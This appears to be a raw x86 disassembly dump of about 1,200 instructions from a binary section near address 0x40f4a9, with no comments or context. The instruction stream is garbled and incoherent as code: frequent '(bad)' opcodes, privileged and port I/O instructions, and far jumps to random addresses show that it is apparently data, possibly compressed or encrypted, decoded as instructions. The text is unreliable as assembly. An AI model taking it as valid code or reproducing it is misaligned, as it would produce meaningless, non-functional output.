  40f4a9:	sub    DWORD PTR [edi+0x3d16006f],ebp
  40f4af:	mov    ds:0xc3666cc1,al
  40f4b4:	push   0xa915ac82
  40f4b9:	stos   DWORD PTR es:[edi],eax
  40f4ba:	inc    ebp
  40f4bb:	sbb    BYTE PTR [edx-0x4a20df68],dh
  40f4c1:	jge    0x40f536
  40f4c3:	push   0x4986b53
  40f4c8:	rcr    BYTE PTR [esp+ebp*4],0xb
  40f4cc:	(bad)  
  40f4cd:	push   0x45
  40f4cf:	fcom   QWORD PTR [ecx]
  40f4d1:	mov    ebx,0xa01b7f82
  40f4d6:	fs push esi
  40f4d8:	or     al,0x3b
  40f4da:	inc    ebx
  40f4db:	push   esp
  40f4dc:	add    bl,ah
  40f4de:	stos   BYTE PTR es:[edi],al
  40f4df:	retf   
  40f4e0:	stos   DWORD PTR es:[edi],eax
  40f4e1:	imul   ebx,DWORD PTR [edx],0xb39cfe03
  40f4e7:	mov    bh,0x7d
  40f4e9:	pop    esp
  40f4ea:	imul   si,WORD PTR [ebp-0x6f5e9d0b],0xa3a4
  40f4f3:	sbb    ebp,ebp
  40f4f5:	dec    edx
  40f4f6:	cmp    al,0x2b
  40f4f8:	push   ss
  40f4f9:	cli    
  40f4fa:	les    eax,FWORD PTR [ecx]
  40f4fc:	push   ebx
  40f4fd:	daa    
  40f4fe:	lods   al,BYTE PTR ds:[esi]
  40f4ff:	imul   ecx,DWORD PTR fs:[bx],0x36
  40f504:	sub    BYTE PTR [ecx-0x4e],0xf
  40f508:	or     BYTE PTR [edi+0x75b817ef],0x64
  40f50f:	popf   
  40f510:	shl    bh,1
  40f512:	pop    ebx
  40f513:	lahf   
  40f514:	pop    edx
  40f515:	mov    DWORD PTR [ecx+0x31],eax
  40f518:	fld    TBYTE PTR [ebx+0x6]
  40f51b:	lods   al,BYTE PTR ds:[esi]
  40f51c:	adc    al,dl
  40f51e:	(bad)  
  40f520:	retf   
  40f521:	pop    ss
  40f522:	jge    0x40f52b
  40f524:	stc    
  40f525:	cdq    
  40f526:	jno    0x40f4b1
  40f528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f529:	sbb    bh,BYTE PTR [eax+esi*1]
  40f52c:	repnz and ebp,DWORD PTR [ebx-0x1c]
  40f530:	daa    
  40f531:	xlat   BYTE PTR ds:[ebx]
  40f532:	ficomp DWORD PTR [ecx]
  40f534:	sub    BYTE PTR [edx+0x6a],ch
  40f537:	add    ah,BYTE PTR [ebp+0x4a]
  40f53a:	inc    ebx
  40f53b:	loop   0x40f591
  40f53d:	adc    DWORD PTR [edi+ebx*2],edx
  40f540:	cmc    
  40f541:	add    al,0xea
  40f543:	mov    bl,0xa6
  40f545:	sub    DWORD PTR [edx],ebx
  40f547:	adc    eax,0x895569a5
  40f54c:	int    0x10
  40f54e:	ss pop edx
  40f550:	dec    edx
  40f551:	imul   ebp,DWORD PTR [ebx],0x7f
  40f554:	std    
  40f555:	push   0xffffffc0
  40f557:	retf   
  40f558:	adc    BYTE PTR [ebp-0x16],bl
  40f55b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f55c:	fild   WORD PTR [ecx]
  40f55e:	adc    esi,ebx
  40f560:	fsubr  st(6),st
  40f562:	loopne 0x40f4ed
  40f564:	inc    edx
  40f565:	popf   
  40f566:	and    dl,BYTE PTR [eax]
  40f568:	push   ebx
  40f569:	sub    ebp,DWORD PTR [edi]
  40f56b:	sub    DWORD PTR [eax],ebp
  40f56d:	jmp    0x6b0cf673
  40f572:	(bad)  
  40f573:	out    0xc6,al
  40f575:	inc    ebx
  40f576:	mov    esp,DWORD PTR [ebx+0x460a93f0]
  40f57c:	out    dx,al
  40f57d:	xor    BYTE PTR [edx-0x4b],bl
  40f580:	push   ebx
  40f581:	sbb    bl,cl
  40f583:	ins    DWORD PTR es:[edi],dx
  40f584:	pop    DWORD PTR [ecx+esi*4]
  40f587:	sbb    DWORD PTR [edx+0xe],eax
  40f58a:	test   eax,ecx
  40f58c:	ins    DWORD PTR es:[edi],dx
  40f58d:	sub    eax,0x1f3d9e9c
  40f592:	jns    0x40f564
  40f594:	and    al,0x8d
  40f596:	(bad)  
  40f597:	fstp   TBYTE PTR [edx+0x1eb8aae4]
  40f59d:	jno    0x40f5b5
  40f59f:	pop    ebx
  40f5a0:	or     BYTE PTR [ebp-0x2cb66083],bl
  40f5a6:	retw   
  40f5a8:	enter  0xe42b,0x23
  40f5ac:	jg     0x40f577
  40f5ae:	xchg   edi,eax
  40f5af:	sbb    DWORD PTR [esi],esp
  40f5b1:	pop    eax
  40f5b2:	adc    ebx,edx
  40f5b4:	cmp    al,0x17
  40f5b6:	add    BYTE PTR [esi-0x6d6d1fae],cl
  40f5bc:	rcl    DWORD PTR [esi-0x378cfb63],0xc8
  40f5c3:	sbb    ebx,edx
  40f5c5:	int    0x51
  40f5c7:	mov    eax,ds:0xee69a919
  40f5cc:	push   ebx
  40f5cd:	aaa    
  40f5ce:	icebp  
  40f5cf:	dec    edi
  40f5d0:	jno    0x40f56c
  40f5d2:	sbb    BYTE PTR ss:[ebp+ebx*8-0x1acb7d8],cl
  40f5da:	aad    0xca
  40f5dc:	inc    ebp
  40f5dd:	add    DWORD PTR [edi-0x5caa4c],ecx
  40f5e3:	out    dx,al
  40f5e4:	sbb    BYTE PTR [ecx],cl
  40f5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e7:	xchg   ecx,eax
  40f5e8:	clc    
  40f5e9:	pop    ds
  40f5ea:	mov    eax,?
  40f5ec:	outs   dx,DWORD PTR ds:[esi]
  40f5ed:	add    bh,BYTE PTR [ebp+0x2d]
  40f5f0:	xchg   esi,eax
  40f5f1:	mov    edi,0x2f534ee3
  40f5f6:	int    0xa5
  40f5f8:	test   eax,0xae0ff2cf
  40f5fd:	imul   esp,DWORD PTR [edx+0x52],0xdac6eeb2
  40f604:	lods   al,BYTE PTR ds:[esi]
  40f605:	sub    ebp,DWORD PTR [ebp+ecx*1+0x53]
  40f609:	ror    dl,0x42
  40f60c:	mov    dh,0xce
  40f60e:	jp     0x40f648
  40f610:	sub    DWORD PTR [ecx-0x79],0xffffffab
  40f614:	call   0x2e7e:0x8f3ccab7
  40f61b:	cmc    
  40f61c:	xlat   BYTE PTR ds:[ebx]
  40f61d:	push   0x76
  40f61f:	jmp    0xd8e9a44f
  40f624:	cwde   
  40f625:	imul   ebx,DWORD PTR [eax-0x16],0xca297a89
  40f62c:	push   0x79
  40f62e:	pop    ecx
  40f62f:	jle    0x40f684
  40f631:	pop    ecx
  40f632:	pop    edx
  40f633:	jmp    0x40f5e3
  40f635:	aaa    
  40f636:	jae    0x40f62c
  40f638:	mov    ebp,0x2469826a
  40f63d:	add    eax,0x47edf12e
  40f642:	data16 or bl,bl
  40f645:	aad    0xa6
  40f647:	rcl    BYTE PTR [edx],0x64
  40f64a:	dec    esp
  40f64b:	sbb    BYTE PTR [ecx-0x70705585],ah
  40f651:	repnz sub esp,DWORD PTR [edi]
  40f654:	push   ebx
  40f655:	dec    edx
  40f656:	mov    ds:0x4db8da58,eax
  40f65b:	add    BYTE PTR [ebx+0x2c],ch
  40f65e:	lahf   
  40f65f:	retf   
  40f660:	push   ebx
  40f661:	shl    bh,1
  40f663:	mov    cl,0x25
  40f665:	and    al,0x11
  40f667:	add    eax,0x66bd2367
  40f66c:	shl    BYTE PTR [edi],cl
  40f66e:	sub    edi,DWORD PTR [edx-0x70]
  40f671:	fwait
  40f672:	mov    edx,0xaf4f8788
  40f677:	sub    al,0x61
  40f679:	test   eax,0xc4d00921
  40f67e:	xor    BYTE PTR [eax],0x53
  40f681:	dec    ebp
  40f682:	stos   BYTE PTR es:[edi],al
  40f683:	jge    0x40f6d6
  40f685:	arpl   WORD PTR [edx+0x416aebe0],di
  40f68b:	add    al,0xc7
  40f68d:	fbld   TBYTE PTR [eax+0x76]
  40f690:	neg    BYTE PTR [eax+0x38]
  40f693:	sub    al,0x5c
  40f695:	jmp    0x8034:0x80712afc
  40f69c:	ror    DWORD PTR ss:[esi+0x47],cl
  40f6a0:	lods   al,BYTE PTR ds:[esi]
  40f6a1:	in     eax,dx
  40f6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6a3:	sbb    DWORD PTR [ecx],ebp
  40f6a5:	pop    edi
  40f6a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6a7:	mov    WORD PTR [ecx+edi*2],cs
  40f6aa:	bound  eax,QWORD PTR [ebx]
  40f6ac:	aaa    
  40f6ad:	popf   
  40f6ae:	data16 (bad) 
  40f6b1:	fdivr  DWORD PTR [ebx-0x58]
  40f6b4:	ins    BYTE PTR es:[edi],dx
  40f6b5:	int    0xfc
  40f6b7:	lods   al,BYTE PTR ds:[esi]
  40f6b8:	mov    dh,0x23
  40f6ba:	out    dx,eax
  40f6bb:	xchg   ebx,eax
  40f6bc:	aad    0xce
  40f6be:	push   es
  40f6bf:	std    
  40f6c0:	pop    ebx
  40f6c1:	jne    0x40f6f4
  40f6c3:	imul   edx,DWORD PTR [ebp-0x9],0xfffffffe
  40f6c7:	fcom   st(3)
  40f6c9:	dec    edx
  40f6ca:	mov    esi,0x47a8f053
  40f6cf:	sbb    bh,cl
  40f6d1:	mov    al,0x37
  40f6d3:	and    dl,ch
  40f6d5:	push   ecx
  40f6d6:	jge    0x40f753
  40f6d8:	push   ebx
  40f6d9:	outs   dx,DWORD PTR ds:[esi]
  40f6da:	loopne 0x40f6d9
  40f6dc:	lea    ebp,[ebx+0x696d0c14]
  40f6e2:	xchg   edx,eax
  40f6e3:	xor    al,BYTE PTR [esi-0x45]
  40f6e6:	add    ebx,ebp
  40f6e8:	xchg   edx,eax
  40f6e9:	jge    0x40f764
  40f6eb:	aaa    
  40f6ec:	test   al,0x2e
  40f6ee:	push   ds
  40f6ef:	mov    al,BYTE PTR [edx+0x4f1851e7]
  40f6f5:	lods   al,BYTE PTR ds:[esi]
  40f6f6:	sbb    al,0x25
  40f6f8:	xor    edi,DWORD PTR [ebp-0x14ac2b76]
  40f6fe:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f700:	hlt    
  40f701:	in     al,0xac
  40f703:	add    eax,0xc7a0008c
  40f708:	fmulp  st(6),st
  40f70a:	in     al,dx
  40f70b:	nop
  40f70c:	xlat   BYTE PTR ds:[ebx]
  40f70d:	cmp    dh,BYTE PTR [eax+ebx*4-0x6c]
  40f711:	test   DWORD PTR [ecx+0x69],ecx
  40f714:	(bad)  
  40f715:	xchg   edx,eax
  40f716:	iret   
  40f717:	pop    edx
  40f718:	retf   0x8eea
  40f71b:	or     esi,DWORD PTR [esi]
  40f71d:	and    eax,0x1b5f88d8
  40f722:	inc    ecx
  40f723:	dec    eax
  40f724:	cmp    eax,0x65df206a
  40f729:	sub    bh,ah
  40f72b:	imul   ebx,DWORD PTR [ecx-0x44],0x69
  40f72f:	inc    esi
  40f730:	call   DWORD PTR [ecx]
  40f732:	data16 inc BYTE PTR [edi]
  40f735:	outs   dx,DWORD PTR ds:[esi]
  40f736:	imul   esp,esi,0x4dfc6978
  40f73c:	lods   eax,DWORD PTR ds:[esi]
  40f73d:	pop    ebx
  40f73f:	mov    edx,0x6966a59c
  40f744:	inc    edx
  40f745:	nop
  40f746:	pop    ds
  40f747:	(bad)  
  40f748:	imul   esp,DWORD PTR [ebx+0x162014a9],0x5a
  40f74f:	or     al,0xcd
  40f751:	push   0xffffff9b
  40f753:	loopne 0x40f79e
  40f755:	mov    WORD PTR [esp+ecx*2-0x71d2c5ba],cs
  40f75c:	pop    es
  40f75d:	jmp    0x40f765
  40f75f:	mov    dl,0xbd
  40f761:	dec    esp
  40f762:	out    0x9d,eax
  40f764:	shr    BYTE PTR [edx+0x60],1
  40f767:	mov    es,WORD PTR [edi+eax*1]
  40f76a:	ret    
  40f76b:	int    0xf8
  40f76d:	mov    dl,0x7b
  40f76f:	js     0x40f7d6
  40f771:	add    ecx,edi
  40f773:	adc    dl,BYTE PTR [ebx-0x21d8994]
  40f779:	shr    ah,1
  40f77b:	sbb    DWORD PTR [edx+0x162f66a4],ebx
  40f781:	call   0x5dcb:0xba53b2fb
  40f788:	xchg   BYTE PTR [edx],bh
  40f78a:	gs ds inc esp
  40f78d:	xchg   esi,eax
  40f78e:	mov    dh,dl
  40f790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f791:	sub    BYTE PTR [ebp-0x192b1d87],al
  40f797:	mov    DWORD PTR [ecx+0x43],edi
  40f79a:	push   di
  40f79c:	inc    eax
  40f79d:	jno    0x40f79e
  40f79f:	and    al,0xa2
  40f7a1:	sub    ah,BYTE PTR [eax+0x4b3cdbd0]
  40f7a7:	xor    eax,DWORD PTR [edi-0x26]
  40f7aa:	scas   al,BYTE PTR es:[edi]
  40f7ab:	xor    edx,DWORD PTR [edi-0x2812d2ca]
  40f7b1:	push   0x2c
  40f7b3:	pop    ds
  40f7b4:	sbb    eax,0x15dd416c
  40f7b9:	add    al,0xc9
  40f7bb:	js     0x40f7d6
  40f7bd:	add    bh,BYTE PTR [ecx+0xe]
  40f7c0:	fdivr  QWORD PTR [edx]
  40f7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c3:	pop    ecx
  40f7c4:	push   ebx
  40f7c5:	pop    esi
  40f7c6:	jg     0x40f809
  40f7c8:	outs   dx,BYTE PTR ds:[esi]
  40f7c9:	adc    DWORD PTR [edx-0x2d9510c3],ebp
  40f7cf:	sbb    al,0xff
  40f7d1:	shl    BYTE PTR [ebx+0xb2b888b],1
  40f7d7:	sub    edi,edx
  40f7d9:	inc    ebx
  40f7da:	push   0xffffff98
  40f7dc:	pusha  
  40f7dd:	adc    ebx,DWORD PTR [ebx]
  40f7df:	mov    eax,0xf5ebc53d
  40f7e4:	fisub  DWORD PTR [ecx+ebx*4+0x19]
  40f7e8:	xchg   esp,eax
  40f7e9:	mov    esi,esp
  40f7eb:	dec    esi
  40f7ec:	xor    BYTE PTR [esi+eiz*2-0x1fa346b4],bl
  40f7f3:	xor    BYTE PTR [eax-0x5ce6709f],dh
  40f7f9:	sbb    eax,0x708ea746
  40f7fe:	adc    edx,DWORD PTR [edx+0x53]
  40f801:	shr    DWORD PTR [esi+0x726489b6],0x14
  40f808:	imul   BYTE PTR [edx+0x17]
  40f80b:	lahf   
  40f80c:	xlat   BYTE PTR ds:[ebx]
  40f80d:	sub    ah,bl
  40f80f:	pushf  
  40f810:	mov    ds:0xbc66652,al
  40f815:	cmp    cl,ah
  40f817:	xor    ebx,ecx
  40f819:	lds    ebx,FWORD PTR ds:0xd1af6baa
  40f81f:	adc    DWORD PTR [ebx],edx
  40f821:	and    DWORD PTR [edi],ebp
  40f823:	jge    0x40f844
  40f825:	(bad)  
  40f826:	cs aaa 
  40f828:	cld    
  40f829:	test   DWORD PTR [esi-0x26],ecx
  40f82c:	stos   BYTE PTR es:[edi],al
  40f82d:	jle    0x40f818
  40f82f:	(bad)  
  40f830:	leave  
  40f831:	cmp    BYTE PTR [esi+ebp*4-0x1c],0x4b
  40f836:	dec    eax
  40f837:	mov    ebx,0xd6489418
  40f83c:	outs   dx,DWORD PTR ds:[esi]
  40f83d:	jp     0x40f8a8
  40f83f:	adc    ah,BYTE PTR [esi+edx*1+0x4f]
  40f843:	cwde   
  40f844:	js     0x40f82d
  40f846:	push   0x6e
  40f848:	xchg   ecx,eax
  40f849:	imul   ebx,DWORD PTR [ebx],0x266a0d26
  40f84f:	cmc    
  40f850:	jp     0x40f83d
  40f852:	data16 test BYTE PTR [esi-0x13],dh
  40f856:	fmul   DWORD PTR [edi]
  40f858:	sbb    bl,al
  40f85a:	jo     0x40f830
  40f85c:	or     al,0x1d
  40f85e:	pop    ss
  40f85f:	cmp    ah,dh
  40f861:	add    eax,0xabe59bab
  40f866:	icebp  
  40f867:	and    esi,eax
  40f869:	xchg   ebp,eax
  40f86a:	data16 or al,0xad
  40f86d:	sbb    edx,DWORD PTR [esi]
  40f86f:	mov    edi,DWORD PTR [bp+di+0x4b]
  40f873:	sbb    BYTE PTR [ebp-0x37],ch
  40f876:	nop
  40f877:	adc    al,0x50
  40f879:	ret    0xe7d9
  40f87c:	push   ebx
  40f87d:	dec    ebp
  40f87e:	push   0x3014f0b3
  40f883:	jle    0x40f871
  40f885:	add    eax,0xabdf2c71
  40f88a:	(bad)  
  40f88b:	imul   bl
  40f88d:	sti    
  40f88e:	(bad)  
  40f890:	push   ebx
  40f891:	popf   
  40f892:	aaa    
  40f893:	shr    DWORD PTR [edi-0x77],cl
  40f896:	test   al,0x70
  40f898:	sbb    bh,BYTE PTR [ebx+0x3a641b1c]
  40f89e:	mov    BYTE PTR [ecx],ah
  40f8a0:	cli    
  40f8a1:	lods   eax,DWORD PTR ds:[esi]
  40f8a2:	add    al,0xaf
  40f8a4:	push   ebp
  40f8a5:	push   es
  40f8a6:	retf   0x2c1d
  40f8a9:	stos   DWORD PTR es:[edi],eax
  40f8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ab:	inc    esi
  40f8ac:	or     eax,0xfdd663b5
  40f8b1:	ins    DWORD PTR es:[edi],dx
  40f8b2:	push   esi
  40f8b3:	push   ebx
  40f8b4:	sti    
  40f8b5:	mov    al,0x39
  40f8b7:	stc    
  40f8b8:	fld    TBYTE PTR ds:[edx]
  40f8bb:	cmp    DWORD PTR [eax-0xf749016],edi
  40f8c1:	mov    esi,0x4e6e05a8
  40f8c6:	das    
  40f8c7:	pop    es
  40f8c8:	and    al,0x8f
  40f8ca:	cmp    DWORD PTR [ecx],ebx
  40f8cc:	shl    BYTE PTR [eax+0x9],1
  40f8cf:	out    dx,al
  40f8d0:	outs   dx,DWORD PTR ds:[esi]
  40f8d1:	popa   
  40f8d2:	mov    ebp,DWORD PTR gs:[ecx]
  40f8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d6:	fadd   st,st(1)
  40f8d8:	int3   
  40f8d9:	sbb    BYTE PTR [ebx-0x699845c7],bh
  40f8df:	xor    al,0x8a
  40f8e1:	je     0x40f951
  40f8e3:	sti    
  40f8e4:	cmp    BYTE PTR [edx-0x36],ch
  40f8e7:	push   esp
  40f8e8:	add    al,0x16
  40f8ea:	arpl   WORD PTR ds:[ebx+0x70],dx
  40f8ee:	mov    ds:0xeb3ab36d,al
  40f8f3:	cmp    ebp,DWORD PTR [ebx]
  40f8f5:	imul   esi,DWORD PTR [eax],0x7e
  40f8f8:	cdq    
  40f8f9:	add    esi,edi
  40f8fb:	(bad)
  40f8fe:	data16 mov ?,WORD PTR [edx-0xe]
  40f902:	mov    ch,0x2
  40f904:	mov    al,ds:0x4dd4dd70
  40f909:	in     al,0x1d
  40f90b:	mov    dl,BYTE PTR [edx+0x3cf7465f]
  40f911:	jne    0x40f97a
  40f913:	or     al,BYTE PTR [ebx+eiz*8]
  40f916:	rcl    DWORD PTR [edi+0x7],1
  40f919:	sub    esi,edi
  40f91b:	mov    dl,0x96
  40f91d:	add    al,0xf5
  40f91f:	push   esi
  40f920:	fcom   QWORD PTR [ebx+0x4fe3dcb3]
  40f926:	or     al,0xe1
  40f928:	push   ebx
  40f929:	sub    edi,ebx
  40f92b:	pcmpeqw mm2,QWORD PTR [ebp-0x2c865617]
  40f932:	rol    DWORD PTR [esi-0x2d],0x9c
  40f936:	gs mov ecx,0x3fcf9923
  40f93c:	push   ebx
  40f93d:	push   ecx
  40f93e:	and    BYTE PTR [ebp-0x4b17aa92],cl
  40f944:	in     al,0x4e
  40f946:	push   ebp
  40f947:	aas    
  40f948:	loop   0x40f974
  40f94a:	xor    esp,edi
  40f94c:	pop    edi
  40f94d:	cmp    DWORD PTR [eax],eax
  40f94f:	inc    eax
  40f950:	push   ebx
  40f951:	xor    ch,BYTE PTR [ebp-0x47]
  40f954:	imul   eax,DWORD PTR [ebx],0x30
  40f957:	xor    dh,BYTE PTR [esi+0x4e]
  40f95a:	push   ecx
  40f95b:	(bad)  [esi]
  40f95d:	call   0x5119:0x174dabde
  40f964:	push   ebx
  40f965:	xchg   edi,eax
  40f966:	repz in al,0x6b
  40f969:	jb     0x40f9b8
  40f96b:	mov    ecx,0xbc664fcf
  40f970:	lock mov cl,0x59
  40f973:	inc    eax
  40f974:	ds imul edi,edx,0xffffff95
  40f978:	lods   al,BYTE PTR ds:[esi]
  40f979:	sbb    BYTE PTR [ebx-0x60],dl
  40f97c:	bswap  edi
  40f97e:	xchg   ebp,eax
  40f97f:	sbb    edx,esi
  40f981:	cmp    ah,BYTE PTR [edi]
  40f983:	xchg   DWORD PTR [edx],ebx
  40f985:	cmp    DWORD PTR [edi-0x78],0x53
  40f989:	and    esi,DWORD PTR [edx+0x3405ee3e]
  40f98f:	add    esp,DWORD PTR [ecx+0x69]
  40f992:	or     bh,BYTE PTR [eax]
  40f994:	ror    BYTE PTR [eax+0x6407f3a1],cl
  40f99a:	jns    0x40f988
  40f99c:	lods   eax,DWORD PTR ds:[esi]
  40f99d:	or     esp,DWORD PTR [esi+esi*2+0x3a]
  40f9a1:	pxor   mm3,QWORD PTR [eax+0x1d46a3f]
  40f9a8:	ja     0x40fa12
  40f9aa:	sub    DWORD PTR [bp+si-0x49],edi
  40f9ae:	data16 repz xor BYTE PTR [ecx],bh
  40f9b2:	add    eax,0xa4d10c09
  40f9b7:	ss xor eax,0x832f31de
  40f9bd:	stos   BYTE PTR es:[edi],al
  40f9be:	xchg   DWORD PTR [ebp-0x3573d5cf],edx
  40f9c4:	addr16 mov ch,0x6c
  40f9c7:	addr16 pop ebp
  40f9c9:	imul   ebx,DWORD PTR [eax],0x164f78f9
  40f9cf:	mov    cl,0x52
  40f9d1:	or     al,0xad
  40f9d3:	or     eax,0x49af0a5
  40f9d8:	aaa    
  40f9d9:	mov    edi,0x29a21925
  40f9de:	jno    0x40f963
  40f9e0:	inc    esp
  40f9e1:	fdiv   DWORD PTR [ebx+0x6c]
  40f9e4:	addr16 sti 
  40f9e6:	adc    eax,0x7c085287
  40f9eb:	test   ah,ah
  40f9ed:	inc    ebp
  40f9ee:	mov    ds:0xea6ab891,al
  40f9f3:	sbb    ah,BYTE PTR [edi]
  40f9f5:	jb     0x40fa1d
  40f9f7:	and    ah,BYTE PTR [eax+0x25e710e2]
  40f9fd:	sbb    BYTE PTR [esi-0x43],ah
  40fa00:	shl    al,cl
  40fa02:	mov    edx,0x1e6a3534
  40fa07:	pop    ds
  40fa08:	cmp    ebx,DWORD PTR [edx+0x29]
  40fa0b:	aas    
  40fa0c:	scas   eax,DWORD PTR es:[edi]
  40fa0d:	cmc    
  40fa0e:	data16 arpl WORD PTR [ebx-0x6e],bx
  40fa12:	and    DWORD PTR [ebp+0x184d529f],0x15
  40fa19:	das    
  40fa1a:	les    ecx,FWORD PTR [edi+eax*8+0x65]
  40fa1e:	pop    ecx
  40fa1f:	mov    edi,0xe8b6853
  40fa24:	adc    al,0x69
  40fa26:	cwde   
  40fa27:	lahf   
  40fa28:	stc    
  40fa29:	push   0xffffffc9
  40fa2b:	inc    esp
  40fa2c:	xchg   cl,al
  40fa2e:	(bad)  
  40fa2f:	scas   al,BYTE PTR es:[edi]
  40fa30:	xchg   edx,eax
  40fa31:	and    DWORD PTR [esi+0x2d],esp
  40fa34:	ret    0x49b4
  40fa37:	and    dl,BYTE PTR [esi-0x7ae39480]
  40fa3d:	imul   esp,DWORD PTR [ebp-0x47363cb6],0x664388ff
  40fa47:	retf   
  40fa48:	sbb    ebp,DWORD PTR [edx-0x2ef27552]
  40fa4e:	or     BYTE PTR [ecx],bl
  40fa50:	pop    edi
  40fa51:	add    bh,ch
  40fa53:	retf   0xb834
  40fa56:	xor    al,0x7d
  40fa58:	push   eax
  40fa59:	fsubr  DWORD PTR [edi]
  40fa5b:	mov    dh,0xb5
  40fa5d:	lock xchg ebp,eax
  40fa5f:	inc    ecx
  40fa60:	aad    0xdd
  40fa62:	sbb    BYTE PTR [ebx],bl
  40fa64:	stc    
  40fa65:	cmp    eax,0x60d4876b
  40fa6a:	pop    eax
  40fa6b:	and    eax,0x303e1753
  40fa70:	lods   eax,DWORD PTR ds:[esi]
  40fa71:	hlt    
  40fa72:	mov    ah,0xe4
  40fa74:	push   0x86cbeb69
  40fa79:	aaa    
  40fa7a:	push   ds
  40fa7b:	mov    bl,0x74
  40fa7d:	mov    edx,0x699b773b
  40fa82:	clc    
  40fa83:	or     BYTE PTR [edi-0x2d1fd3fd],al
  40fa89:	push   0x48
  40fa8b:	cmp    ebx,DWORD PTR ss:[eax-0x70]
  40fa8f:	xor    eax,0x1d969018
  40fa94:	push   ebx
  40fa95:	jo     0x40fa60
  40fa97:	rcr    BYTE PTR [edi-0x4c389f59],cl
  40fa9d:	sbb    BYTE PTR [esi-0xe],ah
  40faa0:	rol    BYTE PTR [ecx+0x46],0xb1
  40faa4:	cmp    edx,DWORD PTR [esi]
  40faa6:	nop
  40faa7:	dec    edx
  40faa8:	push   ebx
  40faa9:	inc    edi
  40faaa:	add    al,0x34
  40faac:	call   DWORD PTR [ecx]
  40faae:	jmp    0x7089a795
  40fab3:	and    al,0xf8
  40fab5:	stos   BYTE PTR es:[edi],al
  40fab6:	inc    esi
  40fab7:	push   eax
  40fab8:	cmp    al,BYTE PTR [eax+0xd55b9cc]
  40fabe:	push   ss
  40fabf:	sbb    DWORD PTR gs:[ebx+0x20],ebp
  40fac3:	out    0x9e,eax
  40fac5:	xor    al,0x20
  40fac7:	sbb    DWORD PTR [ecx],ecx
  40fac9:	call   0xce651e44
  40face:	inc    ecx
  40facf:	xor    edx,DWORD PTR [ebx-0x3d]
  40fad2:	adc    ch,BYTE PTR [ecx+eax*1]
  40fad5:	or     eax,0x6f31c2a7
  40fada:	xchg   DWORD PTR [ecx-0x28feff6f],eax
  40fae0:	pop    esi
  40fae1:	outs   dx,DWORD PTR ds:[esi]
  40fae2:	push   edi
  40fae3:	push   ss
  40fae4:	out    0xe2,al
  40fae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fae7:	sub    DWORD PTR [ecx+0x1414675e],0x9da19696
  40faf1:	lds    ebx,FWORD PTR [edx+0x4c]
  40faf4:	dec    esi
  40faf5:	imul   ecx,DWORD PTR [ecx+ebp*2+0x75],0xf3c2cdfe
  40fafd:	dec    ebx
  40fafe:	jns    0x40fb6b
  40fb00:	xor    al,0x46
  40fb02:	imul   edx,DWORD PTR [ebp+0x64],0x3919b96d
  40fb09:	jp     0x40fb05
  40fb0b:	xchg   esi,eax
  40fb0c:	mov    DWORD PTR [edx+0x21],ebx
  40fb0f:	adc    BYTE PTR [ebx-0x6],dl
  40fb12:	jns    0x40fb29
  40fb14:	mov    ebp,0xc18ecd70
  40fb19:	repnz retf 0x7a19
  40fb1d:	scas   al,BYTE PTR es:[edi]
  40fb1e:	pop    edi
  40fb1f:	lods   eax,DWORD PTR ds:[esi]
  40fb20:	cmp    BYTE PTR [edx-0x44],dl
  40fb23:	mov    WORD PTR [edi],?
  40fb25:	mov    dh,0x79
  40fb27:	in     eax,0x75
  40fb29:	push   edi
  40fb2a:	pop    esi
  40fb2b:	(bad)  
  40fb2c:	ret    
  40fb2d:	dec    esi
  40fb2e:	pushf  
  40fb2f:	sbb    DWORD PTR [ecx+0xfeef76c],edx
  40fb35:	js     0x40fbac
  40fb37:	pop    edx
  40fb38:	push   ebx
  40fb39:	aam    0x2d
  40fb3b:	cmp    DWORD PTR [ebp-0x2d],0xfffffff8
  40fb3f:	push   edi
  40fb40:	outs   dx,DWORD PTR ds:[esi]
  40fb41:	imul   edi,DWORD PTR [ebx],0xfc969e7e
  40fb47:	xchg   edx,eax
  40fb48:	pop    es
  40fb49:	popa   
  40fb4a:	aad    0xb5
  40fb4c:	ret    0x665c
  40fb4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb50:	jg     0x40fb6b
  40fb52:	adc    DWORD PTR [ebp-0x2718f360],esi
  40fb58:	or     DWORD PTR [esi+eiz*8-0x67b689ba],eax
  40fb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb60:	mov    eax,0x53316cf5
  40fb65:	jmp    0xddbda1a9
  40fb6a:	xor    dl,BYTE PTR [edx]
  40fb6c:	or     BYTE PTR [ebx-0x26],ch
  40fb6f:	popa   
  40fb70:	sub    edx,DWORD PTR [ebp+0x26a14485]
  40fb76:	and    ax,0x2ced
  40fb7a:	or     eax,0xda402aba
  40fb7f:	sbb    edi,ecx
  40fb81:	mov    WORD PTR [ebp+0x45],?
  40fb84:	data16 js 0x40fb8d
  40fb87:	in     eax,0x53
  40fb89:	cmp    esi,DWORD PTR [ecx+0x26]
  40fb8c:	push   ecx
  40fb8d:	fs add eax,edx
  40fb90:	out    dx,al
  40fb91:	add    DWORD PTR [ecx+0x15],esp
  40fb94:	out    0x20,al
  40fb96:	mov    ss,WORD PTR [esi]
  40fb98:	jne    0x40fbd0
  40fb9a:	nop
  40fb9b:	xor    eax,0x8d665090
  40fba0:	xor    al,0x39
  40fba2:	pop    ebx
  40fba3:	dec    eax
  40fba4:	into   
  40fba5:	jno    0x40fb67
  40fba7:	or     ecx,ebp
  40fba9:	push   0x7d
  40fbab:	ror    DWORD PTR [eax],0x4e
  40fbae:	push   eax
  40fbaf:	int3   
  40fbb0:	or     al,0xaf
  40fbb2:	outs   dx,DWORD PTR ds:[esi]
  40fbb3:	cmp    eax,0x9ef0bd53
  40fbb8:	je     0x40fbaa
  40fbba:	and    ecx,DWORD PTR [edi-0x645b1717]
  40fbc0:	push   es
  40fbc1:	xchg   ebx,eax
  40fbc2:	add    eax,0xa6acf41b
